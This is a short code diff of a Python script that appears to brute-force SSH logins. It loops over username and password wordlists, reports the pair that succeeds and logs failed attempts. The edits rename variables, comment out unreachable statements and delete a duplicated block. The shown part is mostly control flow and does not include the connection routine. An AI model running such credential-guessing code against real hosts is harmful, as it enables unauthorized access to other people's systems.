@@ -98,14 +98,14 @@ try:
                     _user = _user.strip('\n')
                     _password = _password.strip('\n')
                     if response == 0:
-                        print("%s[*] User: %s [*] Password: %s%s" % (line, username, password, line))
-                        continue
+                        print("%s[*] User: %s [*] Password: %s%s" % (line, _user, _password, line))
+                        # continue
                         sys.exit(0)
                     elif response == 1:
-                        print("[*] User: %s [*] Password: %s >>> Login Incorrect !!! " % (username, password))
+                        print("[*] User: %s [*] Password: %s [ Login Incorrect ] " % (_user, _password))
                     elif response == 2:
                         print("[*] Connection Could Not Be Established To Address: %s" % host)
-                        continue
+                        # continue
                         sys.exit(2)
 except Exception as e:
     print(e)
@@ -113,22 +113,6 @@ except Exception as e:
 finally:
     U.close()
     P.close()
-
-    password = i.strip("\n")
-    try:
-        response = ssh_connect(password)
-
-        if response == 0:
-            print("%s[*] User: %s [*] Password: %s%s" % (line, username, password, line))
-            sys.exit(0)
-        elif response == 1:
-            print("[*] User: %s [*] Password: %s >>> Login Incorrect !!! " % (username, password))
-        elif response == 1:
-            print("[*] Connection Could Not Be Established To Address: %s" % host)
-            sys.exit(2)
-    except Exception as e:
-        print(e)
-        pass
 
 inputFilePasswd.close()
 inputFileUsername.close()
